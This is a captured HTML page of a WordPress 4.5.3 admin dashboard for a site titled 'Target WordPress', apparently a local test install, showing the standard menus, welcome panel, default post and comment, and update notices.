    <style type="text/css" media="print">#wpadminbar { display:none; }</style>
    </head>
    <body class="wp-admin wp-core-ui no-js  index-php auto-fold admin-bar branch-4-5 version-4-5-3 admin-color-fresh locale-en-us no-customize-support no-svg">
    <script type="text/javascript">
    	document.body.className = document.body.className.replace('no-js','js');
    </script>
    
    	<script type="text/javascript">
    		(function() {
    			var request, b = document.body, c = 'className', cs = 'customize-support', rcs = new RegExp('(^|\\s+)(no-)?'+cs+'(\\s+|$)');
    
    			request = true;
    
    			b[c] = b[c].replace( rcs, ' ' );
    			b[c] += ( window.postMessage && request ? ' ' : ' no-' ) + cs;
    		}());
    	</script>
    	
    <div id="wpwrap">
    
    <div id="adminmenumain" role="navigation" aria-label="Main menu">
    <a href="#wpbody-content" class="screen-reader-shortcut">Skip to main content</a>
    <a href="#wp-toolbar" class="screen-reader-shortcut">Skip to toolbar</a>
    <div id="adminmenuback"></div>
    <div id="adminmenuwrap">
    <ul id="adminmenu">
    
    
    	<li class="wp-first-item wp-has-submenu wp-has-current-submenu wp-menu-open menu-top menu-top-first menu-icon-dashboard menu-top-last" id="menu-dashboard">
    	<a href='index.php' class="wp-first-item wp-has-submenu wp-has-current-submenu wp-menu-open menu-top menu-top-first menu-icon-dashboard menu-top-last" ><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-dashboard'><br /></div><div class='wp-menu-name'>Dashboard</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Dashboard</li><li class="wp-first-item current"><a href='index.php' class="wp-first-item current">Home</a></li><li><a href='update-core.php'>Updates <span class='update-plugins count-4' title='1 WordPress Update, 3 Theme Updates'><span class='update-count'>4</span></span></a></li></ul></li>
    	<li class="wp-not-current-submenu wp-menu-separator" aria-hidden="true"><div class="separator"></div></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-post open-if-no-js menu-top-first" id="menu-posts">
    	<a href='edit.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-post open-if-no-js menu-top-first" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-post'><br /></div><div class='wp-menu-name'>Posts</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Posts</li><li class="wp-first-item"><a href='edit.php' class="wp-first-item">All Posts</a></li><li><a href='post-new.php'>Add New</a></li><li><a href='edit-tags.php?taxonomy=category'>Categories</a></li><li><a href='edit-tags.php?taxonomy=post_tag'>Tags</a></li></ul></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-media" id="menu-media">
    	<a href='upload.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-media" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-media'><br /></div><div class='wp-menu-name'>Media</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Media</li><li class="wp-first-item"><a href='upload.php' class="wp-first-item">Library</a></li><li><a href='media-new.php'>Add New</a></li></ul></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-page" id="menu-pages">
    	<a href='edit.php?post_type=page' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-page" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-page'><br /></div><div class='wp-menu-name'>Pages</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Pages</li><li class="wp-first-item"><a href='edit.php?post_type=page' class="wp-first-item">All Pages</a></li><li><a href='post-new.php?post_type=page'>Add New</a></li></ul></li>
    	<li class="wp-not-current-submenu menu-top menu-icon-comments menu-top-last" id="menu-comments">
    	<a href='edit-comments.php' class="wp-not-current-submenu menu-top menu-icon-comments menu-top-last" ><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-comments'><br /></div><div class='wp-menu-name'>Comments <span class="awaiting-mod count-0"><span class="pending-count">0</span></span></div></a></li>
    	<li class="wp-not-current-submenu wp-menu-separator" aria-hidden="true"><div class="separator"></div></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-appearance menu-top-first" id="menu-appearance">
    	<a href='themes.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-appearance menu-top-first" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-appearance'><br /></div><div class='wp-menu-name'>Appearance</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Appearance</li><li class="wp-first-item"><a href='themes.php' class="wp-first-item">Themes</a></li><li class="hide-if-no-customize"><a href='customize.php?return=%2Fwp-admin%2F' class="hide-if-no-customize">Customize</a></li><li><a href='widgets.php'>Widgets</a></li><li><a href='nav-menus.php'>Menus</a></li><li class="hide-if-no-customize"><a href='customize.php?return=%2Fwp-admin%2F&#038;autofocus%5Bcontrol%5D=header_image' class="hide-if-no-customize">Header</a></li><li class="hide-if-no-customize"><a href='customize.php?return=%2Fwp-admin%2F&#038;autofocus%5Bcontrol%5D=background_image' class="hide-if-no-customize">Background</a></li><li><a href='themes.php?page=custom-header'>Header</a></li><li><a href='themes.php?page=custom-background'>Background</a></li><li><a href='theme-editor.php'>Editor</a></li></ul></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-plugins" id="menu-plugins">
    	<a href='plugins.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-plugins" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-plugins'><br /></div><div class='wp-menu-name'>Plugins <span class='update-plugins count-0'><span class='plugin-count'>0</span></span></div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Plugins <span class='update-plugins count-0'><span class='plugin-count'>0</span></span></li><li class="wp-first-item"><a href='plugins.php' class="wp-first-item">Installed Plugins</a></li><li><a href='plugin-install.php'>Add New</a></li><li><a href='plugin-editor.php'>Editor</a></li></ul></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-users" id="menu-users">
    	<a href='users.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-users" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-users'><br /></div><div class='wp-menu-name'>Users</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Users</li><li class="wp-first-item"><a href='users.php' class="wp-first-item">All Users</a></li><li><a href='user-new.php'>Add New</a></li><li><a href='profile.php'>Your Profile</a></li></ul></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-tools" id="menu-tools">
    	<a href='tools.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-tools" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-tools'><br /></div><div class='wp-menu-name'>Tools</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Tools</li><li class="wp-first-item"><a href='tools.php' class="wp-first-item">Available Tools</a></li><li><a href='import.php'>Import</a></li><li><a href='export.php'>Export</a></li></ul></li>
    	<li class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-settings menu-top-last" id="menu-settings">
    	<a href='options-general.php' class="wp-has-submenu wp-not-current-submenu menu-top menu-icon-settings menu-top-last" aria-haspopup="true"><div class="wp-menu-arrow"><div></div></div><div class='wp-menu-image dashicons-before dashicons-admin-settings'><br /></div><div class='wp-menu-name'>Settings</div></a>
    	<ul class='wp-submenu wp-submenu-wrap'><li class='wp-submenu-head' aria-hidden='true'>Settings</li><li class="wp-first-item"><a href='options-general.php' class="wp-first-item">General</a></li><li><a href='options-writing.php'>Writing</a></li><li><a href='options-reading.php'>Reading</a></li><li><a href='options-discussion.php'>Discussion</a></li><li><a href='options-media.php'>Media</a></li><li><a href='options-permalink.php'>Permalinks</a></li></ul></li><li id="collapse-menu" class="hide-if-no-js"><div id="collapse-button"><div></div></div><span>Collapse menu</span></li></ul>
    </div>
    </div>
    <div id="wpcontent">
    
    		<div id="wpadminbar" class="nojq nojs">
    						<div class="quicklinks" id="wp-toolbar" role="navigation" aria-label="Toolbar" tabindex="0">
    				<ul id="wp-admin-bar-root-default" class="ab-top-menu">
    		<li id="wp-admin-bar-menu-toggle"><a class="ab-item"  href="#"><span class="ab-icon"></span><span class="screen-reader-text">Menu</span></a>		</li>
    		<li id="wp-admin-bar-wp-logo" class="menupop"><a class="ab-item"  aria-haspopup="true" href="/wp-admin/about.php"><span class="ab-icon"></span><span class="screen-reader-text">About WordPress</span></a><div class="ab-sub-wrapper"><ul id="wp-admin-bar-wp-logo-default" class="ab-submenu">
    		<li id="wp-admin-bar-about"><a class="ab-item"  href="/wp-admin/about.php">About WordPress</a>		</li></ul><ul id="wp-admin-bar-wp-logo-external" class="ab-sub-secondary ab-submenu">
    		<li id="wp-admin-bar-wporg"><a class="ab-item"  href="https://wordpress.org/">WordPress.org</a>		</li>
    		<li id="wp-admin-bar-documentation"><a class="ab-item"  href="https://codex.wordpress.org/">Documentation</a>		</li>
    		<li id="wp-admin-bar-support-forums"><a class="ab-item"  href="https://wordpress.org/support/">Support Forums</a>		</li>
    		<li id="wp-admin-bar-feedback"><a class="ab-item"  href="https://wordpress.org/support/forum/requests-and-feedback">Feedback</a>		</li></ul></div>		</li>
    		<li id="wp-admin-bar-site-name" class="menupop"><a class="ab-item"  aria-haspopup="true" href="/">Target WordPress</a><div class="ab-sub-wrapper"><ul id="wp-admin-bar-site-name-default" class="ab-submenu">
    		<li id="wp-admin-bar-view-site"><a class="ab-item"  href="/">Visit Site</a>		</li></ul></div>		</li>
    		<li id="wp-admin-bar-updates"><a class="ab-item"  href="/wp-admin/update-core.php" title="1 WordPress Update, 3 Theme Updates"><span class="ab-icon"></span><span class="ab-label">4</span><span class="screen-reader-text">1 WordPress Update, 3 Theme Updates</span></a>		</li>
    		<li id="wp-admin-bar-comments"><a class="ab-item"  href="/wp-admin/edit-comments.php"><span class="ab-icon"></span><span id="ab-awaiting-mod" class="ab-label awaiting-mod pending-count count-0" aria-hidden="true">0</span><span class="screen-reader-text">0 comments awaiting moderation</span></a>		</li>
    		<li id="wp-admin-bar-new-content" class="menupop"><a class="ab-item"  aria-haspopup="true" href="/wp-admin/post-new.php"><span class="ab-icon"></span><span class="ab-label">New</span></a><div class="ab-sub-wrapper"><ul id="wp-admin-bar-new-content-default" class="ab-submenu">
    		<li id="wp-admin-bar-new-post"><a class="ab-item"  href="/wp-admin/post-new.php">Post</a>		</li>
    		<li id="wp-admin-bar-new-media"><a class="ab-item"  href="/wp-admin/media-new.php">Media</a>		</li>
    		<li id="wp-admin-bar-new-page"><a class="ab-item"  href="/wp-admin/post-new.php?post_type=page">Page</a>		</li>
    		<li id="wp-admin-bar-new-user"><a class="ab-item"  href="/wp-admin/user-new.php">User</a>		</li></ul></div>		</li></ul><ul id="wp-admin-bar-top-secondary" class="ab-top-secondary ab-top-menu">
    		<li id="wp-admin-bar-my-account" class="menupop with-avatar"><a class="ab-item"  aria-haspopup="true" href="/wp-admin/profile.php">Howdy, admin<img alt='' src='http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=26&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=52&amp;d=mm&amp;r=g 2x' class='avatar avatar-26 photo' height='26' width='26' /></a><div class="ab-sub-wrapper"><ul id="wp-admin-bar-user-actions" class="ab-submenu">
    		<li id="wp-admin-bar-user-info"><a class="ab-item" tabindex="-1" href="/wp-admin/profile.php"><img alt='' src='http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=64&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/1e421ab419b5bee07fe7fba2adc4e22f?s=128&amp;d=mm&amp;r=g 2x' class='avatar avatar-64 photo' height='64' width='64' /><span class='display-name'>admin</span></a>		</li>
    		<li id="wp-admin-bar-edit-profile"><a class="ab-item"  href="/wp-admin/profile.php">Edit My Profile</a>		</li>
    		<li id="wp-admin-bar-logout"><a class="ab-item"  href="/wp-login.php?action=logout&#038;_wpnonce=430330cb3e">Log Out</a>		</li></ul></div>		</li></ul>			</div>
    						<a class="screen-reader-shortcut" href="/wp-login.php?action=logout&#038;_wpnonce=430330cb3e">Log Out</a>
    					</div>
    
    		
    <div id="wpbody" role="main">
    
    <div id="wpbody-content" aria-label="Main content" tabindex="0">
    		<div id="screen-meta" class="metabox-prefs">
    
    			<div id="contextual-help-wrap" class="hidden" tabindex="-1" aria-label="Contextual Help Tab">
    				<div id="contextual-help-back"></div>
    				<div id="contextual-help-columns">
    					<div class="contextual-help-tabs">
    						<ul>
    						
    							<li id="tab-link-overview" class="active">
    								<a href="#tab-panel-overview" aria-controls="tab-panel-overview">
    									Overview								</a>
    							</li>
    						
    							<li id="tab-link-help-navigation">
    								<a href="#tab-panel-help-navigation" aria-controls="tab-panel-help-navigation">
    									Navigation								</a>
    							</li>
    						
    							<li id="tab-link-help-layout">
    								<a href="#tab-panel-help-layout" aria-controls="tab-panel-help-layout">
    									Layout								</a>
    							</li>
    						
    							<li id="tab-link-help-content">
    								<a href="#tab-panel-help-content" aria-controls="tab-panel-help-content">
    									Content								</a>
    							</li>
    												</ul>
    					</div>
    
    										<div class="contextual-help-sidebar">
    						<p><strong>For more information:</strong></p><p><a href="https://codex.wordpress.org/Dashboard_Screen" target="_blank">Documentation on Dashboard</a></p><p><a href="https://wordpress.org/support/" target="_blank">Support Forums</a></p>					</div>
    					
    					<div class="contextual-help-tabs-wrap">
    						
    							<div id="tab-panel-overview" class="help-tab-content active">
    								<p>Welcome to your WordPress Dashboard! This is the screen you will see when you log in to your site, and gives you access to all the site management features of WordPress. You can get help for any screen by clicking the Help tab in the upper corner.</p>							</div>
    						
    							<div id="tab-panel-help-navigation" class="help-tab-content">
    								<p>The left-hand navigation menu provides links to all of the WordPress administration screens, with submenu items displayed on hover. You can minimize this menu to a narrow icon strip by clicking on the Collapse Menu arrow at the bottom.</p><p>Links in the Toolbar at the top of the screen connect your dashboard and the front end of your site, and provide access to your profile and helpful WordPress information.</p>							</div>
    						
    							<div id="tab-panel-help-layout" class="help-tab-content">
    								<p>You can use the following controls to arrange your Dashboard screen to suit your workflow. This is true on most other administration screens as well.</p><p><strong>Screen Options</strong> &mdash; Use the Screen Options tab to choose which Dashboard boxes to show.</p><p><strong>Drag and Drop</strong> &mdash; To rearrange the boxes, drag and drop by clicking on the title bar of the selected box and releasing when you see a gray dotted-line rectangle appear in the location you want to place the box.</p><p><strong>Box Controls</strong> &mdash; Click the title bar of the box to expand or collapse it. Some boxes added by plugins may have configurable content, and will show a &#8220;Configure&#8221; link in the title bar if you hover over it.</p>							</div>
    						
    							<div id="tab-panel-help-content" class="help-tab-content">
    								<p>The boxes on your Dashboard screen are:</p><p><strong>At A Glance</strong> &mdash; Displays a summary of the content on your site and identifies which theme and version of WordPress you are using.</p><p><strong>Activity</strong> &mdash; Shows the upcoming scheduled posts, recently published posts, and the most recent comments on your posts and allows you to moderate them.</p><p><strong>Quick Draft</strong> &mdash; Allows you to create a new post and save it as a draft. Also displays links to the 5 most recent draft posts you've started.</p><p><strong>WordPress News</strong> &mdash; Latest news from the official WordPress project, the <a href="https://planet.wordpress.org/">WordPress Planet</a>, and popular and recent plugins.</p><p><strong>Welcome</strong> &mdash; Shows links for some of the most common tasks when setting up a new site.</p>							</div>
    											</div>
    				</div>
    			</div>
    		<div id="screen-options-wrap" class="hidden" tabindex="-1" aria-label="Screen Options Tab">
    <form id='adv-settings' method='post'>
    		<fieldset class="metabox-prefs">
    		<legend>Boxes</legend>
    		<label for="dashboard_right_now-hide"><input class="hide-postbox-tog" name="dashboard_right_now-hide" type="checkbox" id="dashboard_right_now-hide" value="dashboard_right_now" checked="checked" />At a Glance</label>
    <label for="dashboard_activity-hide"><input class="hide-postbox-tog" name="dashboard_activity-hide" type="checkbox" id="dashboard_activity-hide" value="dashboard_activity" checked="checked" />Activity</label>
    <label for="dashboard_quick_press-hide"><input class="hide-postbox-tog" name="dashboard_quick_press-hide" type="checkbox" id="dashboard_quick_press-hide" value="dashboard_quick_press" checked="checked" /><span class="hide-if-no-js">Quick Draft</span> <span class="hide-if-js">Drafts</span></label>
    <label for="dashboard_primary-hide"><input class="hide-postbox-tog" name="dashboard_primary-hide" type="checkbox" id="dashboard_primary-hide" value="dashboard_primary" checked="checked" />WordPress News</label>
    <label for="wp_welcome_panel-hide"><input type="checkbox" id="wp_welcome_panel-hide" checked='checked' />Welcome</label>
    		</fieldset>
    		
    <input type="hidden" id="screenoptionnonce" name="screenoptionnonce" value="506ee5a7f1" />
    </form>
    </div>		</div>
    				<div id="screen-meta-links">
    					<div id="contextual-help-link-wrap" class="hide-if-no-js screen-meta-toggle">
    			<button type="button" id="contextual-help-link" class="button show-settings" aria-controls="contextual-help-wrap" aria-expanded="false">Help</button>
    			</div>
    					<div id="screen-options-link-wrap" class="hide-if-no-js screen-meta-toggle">
    			<button type="button" id="show-settings-link" class="button show-settings" aria-controls="screen-options-wrap" aria-expanded="false">Screen Options</button>
    			</div>
    				</div>
    		<div class='update-nag'><a href="https://codex.wordpress.org/Version_4.9.8">WordPress 4.9.8</a> is available! <a href="/wp-admin/update-core.php" aria-label="Please update WordPress now">Please update now</a>.</div>
    <div class="wrap">
    	<h1>Dashboard</h1>
    
    
    	<div id="welcome-panel" class="welcome-panel">
    		<input type="hidden" id="welcomepanelnonce" name="welcomepanelnonce" value="ae916b2120" />		<a class="welcome-panel-close" href="/wp-admin/?welcome=0" aria-label="Dismiss the welcome panel">Dismiss</a>
    			<div class="welcome-panel-content">
    	<h2>Welcome to WordPress!</h2>
    	<p class="about-description">We&#8217;ve assembled some links to get you started:</p>
    	<div class="welcome-panel-column-container">
    	<div class="welcome-panel-column">
    					<h3>Get Started</h3>
    			<a class="button button-primary button-hero load-customize hide-if-no-customize" href="/wp-admin/customize.php">Customize Your Site</a>
    				<a class="button button-primary button-hero hide-if-customize" href="/wp-admin/themes.php">Customize Your Site</a>
    					<p class="hide-if-no-customize">or, <a href="/wp-admin/themes.php">change your theme completely</a></p>
    			</div>
    	<div class="welcome-panel-column">
    		<h3>Next Steps</h3>
    		<ul>
    					<li><a href="/wp-admin/post-new.php" class="welcome-icon welcome-write-blog">Write your first blog post</a></li>
    			<li><a href="/wp-admin/post-new.php?post_type=page" class="welcome-icon welcome-add-page">Add an About page</a></li>
    					<li><a href="/" class="welcome-icon welcome-view-site">View your site</a></li>
    		</ul>
    	</div>
    	<div class="welcome-panel-column welcome-panel-last">
    		<h3>More Actions</h3>
    		<ul>
    					<li><div class="welcome-icon welcome-widgets-menus">Manage <a href="/wp-admin/widgets.php">widgets</a> or <a href="/wp-admin/nav-menus.php">menus</a></div></li>
    							<li><a href="/wp-admin/options-discussion.php" class="welcome-icon welcome-comments">Turn comments on or off</a></li>
    					<li><a href="https://codex.wordpress.org/First_Steps_With_WordPress" class="welcome-icon welcome-learn-more">Learn more about getting started</a></li>
    		</ul>
    	</div>
    	</div>
    	</div>
    		</div>
    
    	<div id="dashboard-widgets-wrap">
    	<div id="dashboard-widgets" class="metabox-holder">
    	<div id="postbox-container-1" class="postbox-container">
    	<div id="normal-sortables" class="meta-box-sortables"><div id="dashboard_right_now" class="postbox " >
    <button type="button" class="handlediv button-link" aria-expanded="true"><span class="screen-reader-text">Toggle panel: At a Glance</span><span class="toggle-indicator" aria-hidden="true"></span></button><h2 class='hndle'><span>At a Glance</span></h2>
    <div class="inside">
    	<div class="main">
    	<ul>
    	<li class="post-count"><a href="edit.php?post_type=post">1 Post</a></li><li class="page-count"><a href="edit.php?post_type=page">1 Page</a></li>		<li class="comment-count"><a href="edit-comments.php">1 Comment</a></li>
    				<li class="comment-mod-count hidden"><a href="edit-comments.php?comment_status=moderated" aria-label="0 comments in moderation">0 in moderation</a></li>
    			</ul>
    	<p id='wp-version-message'><a href="/wp-admin/update-core.php" class="button" aria-describedby="wp-version">Update to 4.9.8</a> <span id="wp-version">WordPress 4.5.3 running <a href="themes.php">Twenty Sixteen</a> theme.</span></p>	</div>
    	</div>
    </div>
    <div id="dashboard_activity" class="postbox " >
    <button type="button" class="handlediv button-link" aria-expanded="true"><span class="screen-reader-text">Toggle panel: Activity</span><span class="toggle-indicator" aria-hidden="true"></span></button><h2 class='hndle'><span>Activity</span></h2>
    <div class="inside">
    <div id="activity-widget"><div id="published-posts" class="activity-block"><h3>Recently Published</h3><ul><li><span>Jul 12th, 7:19 pm</span> <a href="/wp-admin/post.php?post=1&amp;action=edit" aria-label="Edit &#8220;Hello world!&#8221;">Hello world!</a></li></ul></div><div id="latest-comments" class="activity-block"><h3>Recent Comments</h3><ul id="the-comment-list" data-wp-lists="list:comment">
    		<li id="comment-1" class="comment even thread-even depth-1 comment-item approved">
    
    			<img alt='' src='http://0.gravatar.com/avatar/?s=50&#038;d=mm&#038;r=g' srcset='http://1.gravatar.com/avatar/?s=100&amp;d=mm&amp;r=g 2x' class='avatar avatar-50 photo avatar-default' height='50' width='50' />
    			
    			<div class="dashboard-comment-wrap has-row-actions">
    			<p class="comment-meta">
    			From <cite class="comment-author"><a href='https://wordpress.org/' rel='external nofollow' class='url'>Mr WordPress</a></cite> on <a href='/2018/07/12/hello-world/'>Hello world!</a> <span class="approve">[Pending]</span>			</p>
    
    						<blockquote><p>Hi, this is a comment. To delete a comment, just log in and view the post&#039;s comments. There you will&hellip;</p></blockquote>
    						<p class="row-actions"><span class='approve'><a href='comment.php?action=approvecomment&#038;p=1&#038;c=1&#038;_wpnonce=8897d088b0' data-wp-lists='dim:the-comment-list:comment-1:unapproved:e7e7d3:e7e7d3:new=approved' class='vim-a' aria-label='Approve this comment'>Approve</a></span><span class='unapprove'><a href='comment.php?action=unapprovecomment&#038;p=1&#038;c=1&#038;_wpnonce=8897d088b0' data-wp-lists='dim:the-comment-list:comment-1:unapproved:e7e7d3:e7e7d3:new=unapproved' class='vim-u' aria-label='Unapprove this comment'>Unapprove</a></span><span class='reply hide-if-no-js'> | <a onclick="window.commentReply && commentReply.open('1','1');return false;" class="vim-r hide-if-no-js" aria-label="Reply to this comment" href="#">Reply</a></span><span class='edit'> | <a href='comment.php?action=editcomment&amp;c=1' aria-label='Edit this comment'>Edit</a></span><span class='spam'> | <a href='comment.php?action=spamcomment&#038;p=1&#038;c=1&#038;_wpnonce=21314d2bb5' data-wp-lists='delete:the-comment-list:comment-1::spam=1' class='vim-s vim-destructive' aria-label='Mark this comment as spam'>Spam</a></span><span class='trash'> | <a href='comment.php?action=trashcomment&#038;p=1&#038;c=1&#038;_wpnonce=21314d2bb5' data-wp-lists='delete:the-comment-list:comment-1::trash=1' class='delete vim-d vim-destructive' aria-label='Move this comment to the Trash'>Trash</a></span><span class='view'> | <a class="comment-link" href="/2018/07/12/hello-world/#comment-1" aria-label="View this comment">View</a></span></p>
    						</div>
    		</li>
    </ul><h3 class="screen-reader-text">View more comments</h3><ul class='subsubsub'>
    	<li class='all'><a href='/wp-admin/edit-comments.php?comment_status=all'>All <span class="count">(<span class="all-count">1</span>)</span></a> |</li>
    	<li class='moderated'><a href='/wp-admin/edit-comments.php?comment_status=moderated'>Pending <span class="count">(<span class="pending-count">0</span>)</span></a> |</li>
    	<li class='approved'><a href='/wp-admin/edit-comments.php?comment_status=approved'>Approved <span class="count">(<span class="approved-count">1</span>)</span></a> |</li>
    	<li class='spam'><a href='/wp-admin/edit-comments.php?comment_status=spam'>Spam <span class="count">(<span class="spam-count">0</span>)</span></a> |</li>
    	<li class='trash'><a href='/wp-admin/edit-comments.php?comment_status=trash'>Trash <span class="count">(<span class="trash-count">0</span>)</span></a></li>
    </ul><form method="get">
    <div id="com-reply" style="display:none;"><div id="replyrow" style="display:none;">
    	<fieldset class="comment-reply">
    	<legend>
    		<span class="hidden" id="editlegend">Edit Comment</span>
    		<span class="hidden" id="replyhead">Reply to Comment</span>
    		<span class="hidden" id="addhead">Add new Comment</span>
    	</legend>
    
    	<div id="replycontainer">
    	<label for="replycontent" class="screen-reader-text">Comment</label>
    	<div id="wp-replycontent-wrap" class="wp-core-ui wp-editor-wrap html-active"><link rel='stylesheet' id='editor-buttons-css'  href='http://localhost/wp-includes/css/editor.min.css?ver=4.5.3' type='text/css' media='all' />
    <div id="wp-replycontent-editor-container" class="wp-editor-container"><div id="qt_replycontent_toolbar" class="quicktags-toolbar"></div><textarea class="wp-editor-area" rows="20" cols="40" name="replycontent" id="replycontent"></textarea></div>
    </div>
    
    	</div>
    
    	<div id="edithead" style="display:none;">
    		<div class="inside">
    		<label for="author-name">Name</label>
    		<input type="text" name="newcomment_author" size="50" value="" id="author-name" />
    		</div>
    
    		<div class="inside">
    		<label for="author-email">Email</label>
    		<input type="text" name="newcomment_author_email" size="50" value="" id="author-email" />
    		</div>
    
    		<div class="inside">
    		<label for="author-url">URL</label>
    		<input type="text" id="author-url" name="newcomment_author_url" class="code" size="103" value="" />
    		</div>
    	</div>
    
    	<p id="replysubmit" class="submit">
    	<a href="#comments-form" class="save button-primary alignright">
    	<span id="addbtn" style="display:none;">Add Comment</span>
    	<span id="savebtn" style="display:none;">Update Comment</span>
    	<span id="replybtn" style="display:none;">Submit Reply</span></a>
    	<a href="#comments-form" class="cancel button-secondary alignleft">Cancel</a>
    	<span class="waiting spinner"></span>
    	<span class="error" style="display:none;"></span>
    	</p>
    
    	<input type="hidden" name="action" id="action" value="" />
    	<input type="hidden" name="comment_ID" id="comment_ID" value="" />
    	<input type="hidden" name="comment_post_ID" id="comment_post_ID" value="" />
    	<input type="hidden" name="status" id="status" value="" />
    	<input type="hidden" name="position" id="position" value="-1" />
    	<input type="hidden" name="checkbox" id="checkbox" value="0" />
    	<input type="hidden" name="mode" id="mode" value="dashboard" />
    	<input type="hidden" id="_ajax_nonce-replyto-comment" name="_ajax_nonce-replyto-comment" value="b159acb4cf" /><input type="hidden" id="_wp_unfiltered_html_comment" name="_wp_unfiltered_html_comment" value="db2174ceba" />	</fieldset>
    </div></div>
    </form>
    <div class="hidden" id="trash-undo-holder">
    	<div class="trash-undo-inside">Comment by <strong></strong> moved to the trash. <span class="undo untrash"><a href="#">Undo</a></span></div>
    </div>
    <div class="hidden" id="spam-undo-holder">
    	<div class="spam-undo-inside">Comment by <strong></strong> marked as spam. <span class="undo unspam"><a href="#">Undo</a></span></div>
    </div>
    </div></div></div>
    </div>
    </div>	</div>
    	<div id="postbox-container-2" class="postbox-container">
    	<div id="side-sortables" class="meta-box-sortables"><div id="dashboard_quick_press" class="postbox " >
    <button type="button" class="handlediv button-link" aria-expanded="true"><span class="screen-reader-text">Toggle panel: <span class="hide-if-no-js">Quick Draft</span> <span class="hide-if-js">Drafts</span></span><span class="toggle-indicator" aria-hidden="true"></span></button><h2 class='hndle'><span><span class="hide-if-no-js">Quick Draft</span> <span class="hide-if-js">Drafts</span></span></h2>
    <div class="inside">
    
    	<form name="post" action="/wp-admin/post.php" method="post" id="quick-press" class="initial-form hide-if-no-js">
    
    		
    		<div class="input-text-wrap" id="title-wrap">
    			<label class="screen-reader-text prompt" for="title" id="title-prompt-text">
    
    				Title			</label>
    			<input type="text" name="post_title" id="title" autocomplete="off" />
    		</div>
    
    		<div class="textarea-wrap" id="description-wrap">
    			<label class="screen-reader-text prompt" for="content" id="content-prompt-text">What&#8217;s on your mind?</label>
    			<textarea name="content" id="content" class="mceEditor" rows="3" cols="15" autocomplete="off"></textarea>
    		</div>
    
    		<p class="submit">
    			<input type="hidden" name="action" id="quickpost-action" value="post-quickdraft-save" />
    			<input type="hidden" name="post_ID" value="3" />
    			<input type="hidden" name="post_type" value="post" />
    			<input type="hidden" id="_wpnonce" name="_wpnonce" value="cc873a8d20" /><input type="hidden" name="_wp_http_referer" value="/wp-admin/" />			<input type="submit" name="save" id="save-post" class="button button-primary" value="Save Draft"  />			<br class="clear" />
    		</p>
    
    	</form>
    	</div>
    </div>
    <div id="dashboard_primary" class="postbox " >
    <button type="button" class="handlediv button-link" aria-expanded="true"><span class="screen-reader-text">Toggle panel: WordPress News</span><span class="toggle-indicator" aria-hidden="true"></span></button><h2 class='hndle'><span>WordPress News</span></h2>
    <div class="inside">
    <p class="widget-loading hide-if-no-js">Loading&#8230;</p><p class="hide-if-js">This widget requires JavaScript.</p></div>
    </div>
    </div>	</div>
    	<div id="postbox-container-3" class="postbox-container">
    	<div id="column3-sortables" class="meta-box-sortables"></div>	</div>
    	<div id="postbox-container-4" class="postbox-container">
    	<div id="column4-sortables" class="meta-box-sortables"></div>	</div>
    </div>
    
    <input type="hidden" id="closedpostboxesnonce" name="closedpostboxesnonce" value="75844f305c" /><input type="hidden" id="meta-box-order-nonce" name="meta-box-order-nonce" value="e0f7328a92" />	</div><!-- dashboard-widgets-wrap -->
    
    </div><!-- wrap -->
    
    
    <div class="clear"></div></div><!-- wpbody-content -->
    <div class="clear"></div></div><!-- wpbody -->
    <div class="clear"></div></div><!-- wpcontent -->
    
    <div id="wpfooter" role="contentinfo">
    		<p id="footer-left" class="alignleft">
    		<span id="footer-thankyou">Thank you for creating with <a href="https://wordpress.org/">WordPress</a>.</span>	</p>
    	<p id="footer-upgrade" class="alignright">
    		<strong><a href="/wp-admin/update-core.php">Get Version 4.9.8</a></strong>	</p>
    	<div class="clear"></div>
    </div>
